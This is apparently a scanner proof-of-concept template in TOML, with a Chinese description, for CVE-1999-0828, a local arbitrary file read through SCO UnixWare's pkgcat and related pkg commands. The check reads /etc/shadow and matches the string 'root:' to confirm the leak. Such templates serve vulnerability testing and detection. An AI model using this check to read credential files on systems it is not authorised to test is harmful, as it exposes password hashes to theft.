[info]
author = "ave"
description = "SCO UnixWare 的 pkginfo、pkgcat、pkgparam 等 pkg 命令在处理参数时存在缺陷，本地用户可通过 dacread 权限机制读取系统中的任意文件。本 PoC 通过以普通本地用户身份调用 pkgcat 尝试读取 /etc/shadow 等敏感文件，验证命令是否越权泄露文件内容。"
id = "POC-AVE-1999-0614"
name = "CVE-1999-0828 SCO UnixWare pkg 命令本地任意文件读取 PoC"
severity = "low"
tags = ["ave-1999-0614"]
vuln_id = [
    "CVE-1999-0828",
    "AVE-1999-0614",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
